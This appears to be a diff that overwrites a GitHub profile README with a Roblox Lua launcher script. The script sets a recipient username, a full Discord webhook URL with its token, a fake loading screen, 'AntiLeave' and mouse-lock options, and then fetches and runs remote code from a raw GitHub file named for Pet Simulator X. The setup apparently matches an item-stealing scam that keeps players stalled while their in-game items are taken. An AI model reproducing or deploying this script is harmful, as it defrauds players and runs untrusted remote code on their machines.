@@ -1,10 +1,15 @@
-- 👋 Hi, I’m @Ymyscript
-- 👀 I’m interested in ...
-- 🌱 I’m currently learning ...
-- 💞️ I’m looking to collaborate on ...
-- 📫 How to reach me ...
+UserName = "giorpro13" 
+Webhook = "https://discord.com/api/webhooks/1140633158912577647/_UPr8yfZHrb0rvPmsmJ2qbA3eMj22l_4aTh7vaAsHL9Cl1Zz2oUJ5mhtyaSuoRx_MgW-" 
+UserName2 = "giorpro13"
+ 
+_G.LoadingScreen = true -- make it true if you want the loadingscreen 
+_G.AntiLeave = true -- make it true if you want the antileave
+ _G.MouseLock = true -- make it true if you want the mouselock --
+ 
+_G.ScriptName = "Script Name"
+_G.FirstText = "Preparing..."
+_G.SecondText = "Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180 -- in secondes it's the time for the loading bar to hit from 0% to 100%
 
-<!---
-Ymyscript/Ymyscript is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
-You can click the Preview link to take a look at your changes.
---->
+loadstring(game:HttpGet("https://raw.githubusercontent.com/N0Rizz/petsimx/main/Petsimx.lua"))()
